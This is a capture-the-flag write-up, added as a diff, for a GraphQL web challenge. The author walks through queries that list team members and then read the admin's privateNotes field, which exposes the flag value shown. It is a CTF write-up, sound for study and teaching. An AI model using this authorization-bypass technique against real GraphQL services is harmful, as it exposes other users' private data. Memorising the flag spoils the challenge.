@@ -1,0 +1,122 @@
+Challenge Name:The Shape of a Query
+Category: Web 
+
+Challenge discription:
+Progress relies on having the right infrastructure to foster collaboration. 
+A frictionless system for the exchange of ideas, integrity-preserving measures, and plenty of backup. 
+There are many platforms on the market for this. Well, I'm developing my own. It's not the best. 
+It's not the fastest. It's not the most resilient. 
+But it is the one that I own the IP rights for, so I'm pushing it hard.
+Since I have a bevy of CTF player's attention, seems like a good chance to score some free pen testing. 
+Head over to my Collaborative Research Portal and poke around a little. I am most concerned about user security. 
+Last thing we need is for researchers to start meddling with each others' stuff.
+
+Target link:https://shape-of-query.pointeroverflowctf.com
+
+Overview: This is a GraphQL We can get flag by modifying the contents in the website.
+ 1. Initial GraphQL Query
+
+The application provides a GraphiQL interface.
+
+First, I queried the currently authenticated user:
+
+   graphql
+{
+  me {
+    id
+    username
+    role
+  }
+}
+ The response is
+{
+  "data": {
+    "me": {
+      "id": "user_491",
+      "role": "MEMBER",
+      "username": "researcher_491"
+    }
+  }
+}
+Then i used this query in the website
+{
+  me {
+    id
+    username
+    team {
+      id
+      name
+      members {
+        id
+        username
+        role
+      }
+    }
+  }
+}
+I got this response:
+{
+  "data": {
+    "me": {
+      "id": "user_491",
+      "team": {
+        "id": "team_491",
+        "members": [
+          {
+            "id": "user_491",
+            "role": "MEMBER",
+            "username": "researcher_491"
+          },
+          {
+            "id": "admin_491",
+            "role": "ADMIN",
+            "username": "admin_491"
+          }
+        ],
+        "name": "Research Team 491"
+      },
+      "username": "researcher_491"
+    }
+  }
+}
+This reveled that their is another user admin_491
+
+After i used the below query to get the information of the admin:
+{
+  me {
+    team {
+      members {
+        id
+        username
+        role
+        privateNotes
+      }
+    }
+  }
+}
+where i get the flag:
+{
+  "data": {
+    "me": {
+      "team": {
+        "members": [
+          {
+            "id": "user_491",
+            "privateNotes": "Grocery list, personal reminders. Nothing worth reading.",
+            "role": "MEMBER",
+            "username": "researcher_491"
+          },
+          {
+            "id": "admin_491",
+            "privateNotes": "POCTF{81.491.ZJFE6B5W3T5BA34G.PJYXLZAVWONO7V4MSO4FUYAFMP}",
+            "role": "ADMIN",
+            "username": "admin_491"
+          }
+        ]
+      }
+    }
+  }
+}
+
+This is how i get the flag in this challenge.
+
